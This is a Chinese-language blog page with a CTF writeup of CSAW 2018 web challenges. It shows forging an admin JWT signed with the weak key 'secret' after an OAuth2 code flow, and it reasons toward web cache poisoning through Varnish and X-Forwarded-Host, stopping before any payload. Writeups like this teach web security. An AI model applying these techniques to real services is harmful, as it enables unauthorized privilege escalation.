@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>CSAW 2018 复现writeup - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="_&amp;emsp;&amp;emsp;补补web">
+<meta name="keywords" content="hexo,javascript">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAW 2018 复现writeup">
+<meta property="og:url" content="http://yoursite.com/2018/09/csaw-writeup2/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="_&amp;emsp;&amp;emsp;补补web">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/10.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/11.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/12.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/13.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/14.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/15.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/16.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/17.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/18.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/19.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/20.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/21.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/22.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/23.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/24.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/25.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/26.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/27.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/28.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/29.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/30.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/31.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/32.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/33.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/34.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/csaw/35.png">
+<meta property="og:updated_time" content="2018-11-23T12:42:42.206Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAW 2018 复现writeup">
+<meta name="twitter:description" content="_&amp;emsp;&amp;emsp;补补web">
+<meta name="twitter:image" content="http://yoursite.com/images/posts/csaw/10.png">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="CSAW 2018 复现writeup" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-09-17T08:47:56.000Z">2018-09-17</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    19 分钟 读完 (大约 2841 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                CSAW 2018 复现writeup
+            
+        </h1>
+        <div class="content">
+            <h1 id=""><a href="#" class="headerlink" title="_"></a>_</h1><p>&emsp;&emsp;补补web<br><a id="more"></a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Don&apos;t you love undocumented APIs</span><br><span class="line"></span><br><span class="line">Be the admin you were always meant to be</span><br><span class="line"></span><br><span class="line">http://web.chal.csaw.io:9000</span><br><span class="line"></span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line"></span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;打开源代码如下：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/protected"</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!--</span></span><br><span class="line"><span class="hljs-comment">Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="hljs-comment">POST /oauth2/token</span></span><br><span class="line"><span class="hljs-comment">POST /oauth2/authorize form-data <span class="hljs-doctag">TODO:</span> make a form for this route</span></span><br><span class="line"><span class="hljs-comment">--!&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;关于OAUTH2.0的授权的详细模式可以参考<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank">这篇文章</a>的<code>六、授权码模式</code>。</p>
+<p>&emsp;&emsp;授权模式大致流程如下：</p>
+<ol>
+<li>获取Authorization Code，通常访问/authorize</li>
+</ol>
+<p>请求的参数：</p>
+<ul>
+<li>response_type：表示授权类型，必选项，此处的值固定为”code”</li>
+<li>client_id：表示客户端的ID，必选项</li>
+<li>redirect_uri：表示重定向URI，可选项</li>
+<li>scope：表示申请的权限范围，可选项</li>
+<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>
+</ul>
+<ol start="2">
+<li>获取Access Token，通常访问/token</li>
+</ol>
+<p>请求的参数：</p>
+<ul>
+<li>grant_type：表示使用的授权模式，必选项，此处的值固定为”authorization_code”。</li>
+<li>code：表示上一步获得的授权码，必选项。</li>
+<li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</li>
+<li>client_id：表示客户端ID，必选项。</li>
+</ul>
+<ol start="3">
+<li>访问限制资源，比如这里的/protected</li>
+</ol>
+<p>&emsp;&emsp;所以第一步，获取Authorization Code。</p>
+<div align="center"><br>    <img src="/images/posts/csaw/10.png"><br></div><br>&emsp;&emsp;然后在我们的服务器上能收到：<br><div align="center"><br>    <img src="/images/posts/csaw/11.png"><br></div><br>&emsp;&emsp;拿到code：<br><br>&emsp;&emsp;再去拿到token。<br><div align="center"><br>    <img src="/images/posts/csaw/12.png"><br></div><br>&emsp;&emsp;得到token：<br><br>&emsp;&emsp;将这个token拿到<a href="https://jwt.io/" target="_blank">jwt.io/</a>解密。<br><div align="center"><br>    <img src="/images/posts/csaw/13.png"><br></div><br>&emsp;&emsp;这里的<code>secret</code>就是加密秘钥，所以我们可以将type改为admin。<br><div align="center"><br>    <img src="/images/posts/csaw/14.png"><br></div><br>&emsp;&emsp;我们拿着这个token去访问<code>/protected</code>。<br><div align="center"><br>    <img src="/images/posts/csaw/15.png"><br></div><br>&emsp;&emsp;得到flag：flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}。<br><br>#### 参考链接<br>&emsp;&emsp;<a href="https://www.aperikube.fr/docs/csawquals_2018/sso/" target="_blank" rel="noopener">https://www.aperikube.fr/docs/csawquals_2018/sso/</a><br><br>&emsp;&emsp;<a href="https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso" target="_blank" rel="noopener">https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso</a><br><br>### Hacker Movie Club<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hacker Movie Club</span><br><span class="line">Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</span><br><span class="line"></span><br><span class="line">Author: itszn (ret2 systems)</span><br><span class="line"></span><br><span class="line">http://app.hm.vulnerable.services/</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/csaw/16.png"><br></div><br>&emsp;&emsp;打开主页如下：<br><div align="center"><br>    <img src="/images/posts/csaw/17.png"><br></div><br>&emsp;&emsp;源码：（去掉style）<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">data-src</span>=<span class="hljs-string">"mustache.min.js"</span> <span class="hljs-attr">data-cdn</span>=<span class="hljs-string">"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">data-src</span>=<span class="hljs-string">"app.js"</span> <span class="hljs-attr">data-cdn</span>=<span class="hljs-string">"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span>Loading..<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">window</span>.loaded_recapcha = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.loaded_recapcha = <span class="hljs-literal">true</span>;</span></span><br><span class="line"><span class="hljs-undefined">&#125;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">window</span>.loaded_mustache = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">window</span>.loaded_mustache = <span class="hljs-literal">true</span>;</span></span><br><span class="line"><span class="hljs-undefined">&#125;</span></span><br><span class="line"><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/cdn.js"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;其中的<code>/cdn.js</code>作用是加上<code>X-Forwarded-Host</code>头去加载上面两个脚本。<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// cdn.js</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> t <span class="hljs-keyword">of</span> <span class="hljs-built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (t.tagName !== <span class="hljs-string">'SCRIPT'</span>)</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="hljs-keyword">if</span> (cdn === <span class="hljs-literal">undefined</span> || src === <span class="hljs-literal">undefined</span>)</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    fetch(<span class="hljs-string">`//<span class="hljs-subst">$&#123;cdn&#125;</span>/cdn/<span class="hljs-subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="hljs-string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.blob()).then(<span class="hljs-function"><span class="hljs-params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span class="line">        <span class="hljs-built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;主页面上还有一个<code>report</code>的功能，一般看到这个一般都会出现XSS利用，但是这道题中并没有输入交互，所以XSS的利用方式还有些不同。<br><br>&emsp;&emsp;app.js如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// app.js</span></span><br><span class="line"><span class="hljs-keyword">var</span> token = <span class="hljs-literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="hljs-string">'/api/movies'</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.json()),</span><br><span class="line">    fetch(<span class="hljs-string">`//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.loaded_recapcha === <span class="hljs-literal">true</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> resolve();</span><br><span class="line">        <span class="hljs-built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.loaded_mustache === <span class="hljs-literal">true</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> resolve();</span><br><span class="line">        <span class="hljs-built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="hljs-function">(<span class="hljs-params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="hljs-string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="hljs-string">'dark'</span>,</span><br><span class="line">        callback: <span class="hljs-function"><span class="hljs-params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).disabled = <span class="hljs-literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="hljs-keyword">let</span> hidden = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).onclick = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"captcha"</span>).parentElement.style.display=<span class="hljs-string">'block'</span>;</span><br><span class="line">          <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'report'</span>).disabled = <span class="hljs-literal">true</span>;</span><br><span class="line">          hidden = <span class="hljs-literal">false</span>;</span><br><span class="line">          <span class="hljs-keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="hljs-string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="hljs-string">'POST'</span>,</span><br><span class="line">            body: <span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.json()).then(<span class="hljs-function"><span class="hljs-params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="hljs-comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="hljs-string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="hljs-string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="hljs-string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;main.mst下载后发现是模板文件。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"movies"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"> <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Year<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Length<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"captcha"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"report"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"report"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;初期的一个探索并没有发现什么有价值的东西，所以我们可以考虑对每个请求包进行分析。<br><br>&emsp;&emsp;在<code>/api/movies</code>响应的body中看到了一个只能由admin查看的项：<br><div align="center"><br>    <img src="/images/posts/csaw/18.png"><br></div><br>&emsp;&emsp;当我们把它通过抓包改成<code>false</code>时，可以发现：<br><div align="center"><br>    <img src="/images/posts/csaw/19.png"><br></div><br><div align="center"><br>    <img src="/images/posts/csaw/20.png"><br></div>
+
+<p>&emsp;&emsp;可以看到，隐藏的项就出来了，所以我们的目的就明确了，但是我们没有太多可以交互的地方，所以还需要找突破点。</p>
+<p>&emsp;&emsp;观察后发现每个响应头都有：<br><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Varnish: 157274709</span><br><span class="line">Age: 0</span><br><span class="line">Via: 1.1 varnish-v4</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;去了解了下<code>varnish</code>，发现它是一个<code>反向代理</code>中的<code>缓存服务</code>程序。</p>
+<blockquote>
+<p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p>
+</blockquote>
+<p>&emsp;&emsp;varnish详细的请求头可以在<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" target="_blank">这里</a>找到。</p>
+<p>&emsp;&emsp;所以这里我们需要用到一种叫<code>Web Cache Poisoning</code>（<code>web缓存污染</code>）的利用方法，这个跟<code>Cache Poisoning</code>（又称DNS污染）是不一样的东西。</p>
+<p>&emsp;&emsp;参考链接：</p>
+<p>&emsp;&emsp;<a href="https://xz.aliyun.com/t/2585" target="_blank">中文版-实战Web缓存中毒</a></p>
